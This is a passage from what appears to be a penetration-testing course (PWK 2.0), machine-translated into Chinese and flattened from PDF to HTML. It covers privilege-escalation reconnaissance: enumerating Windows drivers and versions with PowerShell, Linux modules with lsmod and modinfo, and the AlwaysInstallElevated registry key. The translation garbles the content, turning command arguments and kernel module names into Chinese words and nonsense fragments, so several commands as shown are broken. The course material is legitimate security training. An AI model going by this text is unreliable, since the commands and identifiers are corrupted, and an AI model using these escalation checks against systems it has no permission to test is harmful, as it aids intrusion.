<div style="position:absolute;top:107633;left:409"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启动模式路径</font></font></nobr></div>
<div style="position:absolute;top:107650;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">------------    </font></font></nobr></div>
<div style="position:absolute;top:107650;left:409"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---------- ----</font></font></nobr></div>
<div style="position:absolute;top:107667;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1394 OHCI 兼容主机控制器手册 C:\Windows\system32\drivers\1394ohci.s</font></font></nobr></div>
<div style="position:absolute;top:107684;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3ware    </font></font></nobr></div>
<div style="position:absolute;top:107684;left:409"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">手册 C:\Windows\system32\drivers\3ware.sys</font></font></nobr></div>
<div style="position:absolute;top:107701;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">微软 ACPI 驱动程序    </font></font></nobr></div>
<div style="position:absolute;top:107701;left:409"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启动 C:\Windows\system32\drivers\ACPI.sys</font></font></nobr></div>
<div style="position:absolute;top:107718;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ACPI 设备驱动程序    </font></font></nobr></div>
<div style="position:absolute;top:107718;left:409"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">手册 C:\Windows\system32\drivers\AcpiDev.sy</font></font></nobr></div>
<div style="position:absolute;top:107735;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">微软 ACPIEx 驱动程序    </font></font></nobr></div>
<div style="position:absolute;top:107735;left:409"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启动 C:\Windows\system32\Drivers\acpiex.sys</font></font></nobr></div>
<div style="position:absolute;top:107752;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ACPI 处理器聚合器驱动程序手册 C:\Windows\system32\drivers\acpipagr.s</font></font></nobr></div>
<div style="position:absolute;top:107769;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ACPI 功率计驱动程序    </font></font></nobr></div>
<div style="position:absolute;top:107769;left:409"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">手册 C:\Windows\system32\drivers\acpipmi.sy</font></font></nobr></div>
<div style="position:absolute;top:107786;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ACPI 唤醒警报驱动程序    </font></font></nobr></div>
<div style="position:absolute;top:107786;left:409"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">手册 C:\Windows\system32\drivers\acpitime.s</font></font></nobr></div>
<div style="position:absolute;top:107803;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ADP80XX    </font></font></nobr></div>
<div style="position:absolute;top:107803;left:409"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">手册 C:\Windows\system32\drivers\ADP80XX.SY    </font></font></nobr></div>
<div style="position:absolute;top:107822;left:324"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 544 - 在 Windows 上列出加载的驱动程序</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:107851;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然这会生成已加载驱动程序的列表，但我们必须采取另一个步骤来请求版本</font></font></nobr></div>
<div style="position:absolute;top:107871;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">每个加载的驱动程序的编号。</font><font style="vertical-align: inherit;">我们将使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Get-WmiObject </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">485</font></font></font></nobr></div>
<div style="position:absolute;top:107871;left:661"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cmdlet 来获取</font></font></nobr></div>
<div style="position:absolute;top:107890;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Win32_PnPSignedDriver </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">486</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> WMI 实例，提供有关数字签名信息</font></font></nobr></div>
<div style="position:absolute;top:107909;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">司机。</font><font style="vertical-align: inherit;">通过管道输出到</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Select-Object</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，我们可以枚举特定的属性，包括</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:108033;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">482 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2017 年），https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/driverquery</font></font></font></nobr></div>
<div style="position:absolute;top:108053;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">483 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2017 年），https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/convertfrom-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:108068;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">csv?view=powershell-6</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:108087;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">484 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2017 年），https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/select-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:108102;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对象？视图=powershell-6</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:108121;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">485 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2017 年），https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:108136;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wmiobject?view=powershell-5.1</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:108155;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">486 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（微软，2015 年），https:</font></font><font style="vertical-align: inherit;"> //docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa394354 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(v%3Dvs.85)</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:108283;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="92"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 92 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:108316;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:109393;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:109393;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:109393;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">533</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:108412;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">驱动程序版本</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">此外，我们可以根据驱动程序的名称专门针对驱动程序</font></font></nobr></div>
<div style="position:absolute;top:108431;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出到</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Where-Object</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">487</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:108466;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS C:\Users\student&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Get-WmiObject Win32_PnPSignedDriver | </font><font style="vertical-align: inherit;">选择对象设备名称，D</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:108483;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RiverVersion, 制造商 | </font><font style="vertical-align: inherit;">Where-Object {$_.DeviceName -like "*VMware*"}</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:108517;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设备名称    </font></font></nobr></div>
<div style="position:absolute;top:108517;left:311"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">驱动程序版本制造商</font></font></nobr></div>
<div style="position:absolute;top:108534;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">----------    </font></font></nobr></div>
<div style="position:absolute;top:108534;left:311"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">------------- ------------</font></font></nobr></div>
<div style="position:absolute;top:108551;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">VMware VMCI 主机设备 9.8.6.0 VMware, Inc.</font></font></nobr></div>
<div style="position:absolute;top:108568;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">VMware PVSCSI 控制器 1.3.10.0 VMware, Inc.</font></font></nobr></div>
<div style="position:absolute;top:108585;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">VMware SVGA 3D    </font></font></nobr></div>
<div style="position:absolute;top:108585;left:311"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8.16.1.24 VMware, Inc.</font></font></nobr></div>
<div style="position:absolute;top:108602;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">VMware VMCI 总线设备 9.8.6.0 VMware, Inc.</font></font></nobr></div>
<div style="position:absolute;top:108619;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">VMware 指点设备 12.5.7.0 VMware, Inc.</font></font></nobr></div>
<div style="position:absolute;top:108638;left:322"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 545 - 列出 Windows 上的驱动程序版本</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:108667;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在我们有了所有加载的 VMware 设备驱动程序以及相应版本的列表</font></font></nobr></div>
<div style="position:absolute;top:108687;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">数字，我们可以搜索这些特定驱动程序的漏洞。</font></font></nobr></div>
<div style="position:absolute;top:108720;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Linux 上，我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">lsmod</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">枚举加载的内核模块，</font><font style="vertical-align: inherit;">而无需任何额外的</font></font></nobr></div>
<div style="position:absolute;top:108739;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">论据。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:108774;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@debian:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">lsmod</font></font></font></b></nobr></div>
<div style="position:absolute;top:108791;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块    </font></font></nobr></div>
<div style="position:absolute;top:108791;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用的大小</font></font></nobr></div>
<div style="position:absolute;top:108808;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">保险丝    </font></font></nobr></div>
<div style="position:absolute;top:108808;left:295"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">90112 3</font></font></nobr></div>
<div style="position:absolute;top:108825;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">苹果谈话    </font></font></nobr></div>
<div style="position:absolute;top:108825;left:295"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">32768 0</font></font></nobr></div>
<div style="position:absolute;top:108842;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">斧头25    </font></font></nobr></div>
<div style="position:absolute;top:108842;left:295"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">49152 0</font></font></nobr></div>
<div style="position:absolute;top:108859;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ipx    </font></font></nobr></div>
<div style="position:absolute;top:108859;left:295"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">28672 0</font></font></nobr></div>
<div style="position:absolute;top:108876;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">p8023    </font></font></nobr></div>
<div style="position:absolute;top:108876;left:295"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">16384 1 ipx</font></font></nobr></div>
<div style="position:absolute;top:108893;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">p8022    </font></font></nobr></div>
<div style="position:absolute;top:108893;left:295"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">16384 1 ipx</font></font></nobr></div>
<div style="position:absolute;top:108910;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">截图    </font></font></nobr></div>
<div style="position:absolute;top:108910;left:295"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">16384 2 Appletalk,ipx</font></font></nobr></div>
<div style="position:absolute;top:108927;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有限责任公司    </font></font></nobr></div>
<div style="position:absolute;top:108927;left:295"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">16384 2 p8022，psnap</font></font></nobr></div>
<div style="position:absolute;top:108944;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">evdev    </font></font></nobr></div>
<div style="position:absolute;top:108944;left:295"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20480 5</font></font></nobr></div>
<div style="position:absolute;top:108961;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">vmw_balloon    </font></font></nobr></div>
<div style="position:absolute;top:108961;left:295"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20480 0</font></font></nobr></div>
<div style="position:absolute;top:108977;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">crc32_pclmul    </font></font></nobr></div>
<div style="position:absolute;top:108977;left:295"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">16384 0</font></font></nobr></div>
<div style="position:absolute;top:108994;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:109012;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">i2c_piix4    </font></font></nobr></div>
<div style="position:absolute;top:109012;left:295"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">20480 0</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:109029;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">利巴塔    </font></font></b></nobr></div>
<div style="position:absolute;top:109029;left:287"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192512 2 ata_piix,ata_generic</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:109045;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">scsi_mod    </font></font></nobr></div>
<div style="position:absolute;top:109045;left:287"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">180224 4 sd_mod,libata,sg,vmw_pvscsi</font></font></nobr></div>
<div style="position:absolute;top:109062;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">软盘    </font></font></nobr></div>
<div style="position:absolute;top:109062;left:295"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">57344 0</font></font></nobr></div>
<div style="position:absolute;top:109082;left:335"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 546 - 在 Linux 上列出加载的驱动程序</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:109111;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦我们获得了加载模块的列表并确定了我们想要更多信息的模块，例如</font></font></nobr></div>
<div style="position:absolute;top:109130;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在上面的例子中，我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">modinfo</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来查找有关特定模块的更多信息。</font><font style="vertical-align: inherit;">笔记</font></font></nobr></div>
<div style="position:absolute;top:109150;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个工具需要一个完整的路径名才能运行。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:109185;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">student@debian:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/sbin/modinfo libata</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:109202;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件名：/lib/modules/4.9.0-6-686/kernel/drivers/ata/libata.ko</font></font></b></nobr></div>
<div style="position:absolute;top:109219;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版本：    </font></font></b></nobr></div>
<div style="position:absolute;top:109219;left:238"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.00</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:109236;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执照：    </font></font></nobr></div>
<div style="position:absolute;top:109236;left:238"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通用公共许可证</font></font></nobr></div>
<div style="position:absolute;top:109252;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">描述：ATA 设备的库模块</font></font></nobr></div>
<div style="position:absolute;top:109270;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作者：    </font></font></nobr></div>
<div style="position:absolute;top:109270;left:238"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">杰夫·加兹克</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:109329;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">487 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2017 年），https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/where-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:109344;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对象？视图=powershell-6 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:109471;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="93"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 93 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:109504;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:110581;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:110581;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:110581;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">534</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:109600;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">源版本：7D8076C4A3FEBA6219DD851</font></font></nobr></div>
<div style="position:absolute;top:109616;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">依靠：    </font></font></nobr></div>
<div style="position:absolute;top:109616;left:238"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">scsi_mod</font></font></nobr></div>
<div style="position:absolute;top:109633;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">回复：Y</font></font></nobr></div>
<div style="position:absolute;top:109650;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内部：    </font></font></nobr></div>
<div style="position:absolute;top:109650;left:238"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是</font></font></nobr></div>
<div style="position:absolute;top:109668;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">vermagic：4.9.0-6-686 SMP mod_unload modversions 686</font></font></nobr></div>
<div style="position:absolute;top:109684;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数：    </font></font></nobr></div>
<div style="position:absolute;top:109684;left:238"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">zpodd_poweroff_delay:ZPODD 的关机延迟秒数 (int)</font></font></nobr></div>
<div style="position:absolute;top:109701;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:109721;left:265"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 547 - 列出有关 Linux 上模块的附加信息</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:109750;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与上面演示的 Windows 案例类似，在获取驱动程序及其版本列表后，</font></font></nobr></div>
<div style="position:absolute;top:109769;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果存在，我们可以更好地找到相关的漏洞利用。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:109804;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.1.1.12</font></font></i></nobr></div>
<div style="position:absolute;top:109804;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">枚举 AutoElevate 的二进制文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:109838;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本模块的后面，我们将探索各种提权方法。</font><font style="vertical-align: inherit;">然而，有一个</font></font></nobr></div>
<div style="position:absolute;top:109858;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们应该在本节中介绍的一些特定枚举可以揭示有趣的特定于操作系统的</font></font></nobr></div>
<div style="position:absolute;top:109877;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特权升级的“捷径”。</font></font></nobr></div>
<div style="position:absolute;top:109910;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，在 Windows 系统上，我们应该检查</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AlwaysInstallElevated </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">488</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注册表</font><font style="vertical-align: inherit;">的状态</font></font></nobr></div>
<div style="position:absolute;top:109929;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">环境。</font><font style="vertical-align: inherit;">如果此键</font><font style="vertical-align: inherit;">在</font><i><font style="vertical-align: inherit;">HKEY_CURRENT_USER</font></i><font style="vertical-align: inherit;">或</font><i><font style="vertical-align: inherit;">HKEY_LOCAL_MACHINE 中</font></i><font style="vertical-align: inherit;">启用（设置为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）</font><font style="vertical-align: inherit;">，</font></font><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"></font><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:109949;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">任何用户都可以使用提升的权限运行 Windows Installer 程序包。</font></font></nobr></div>
<div style="position:absolute;top:109981;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">reg 查询</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来检查这些设置：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:110016;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">c:\Users\student&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Insta</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:110033;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">勒</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:110067;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:110084;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AlwaysInstallElevated REG_DWORD 0x1</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:110135;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">c:\Users\student&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Inst</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:110152;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">过敏</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:110186;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
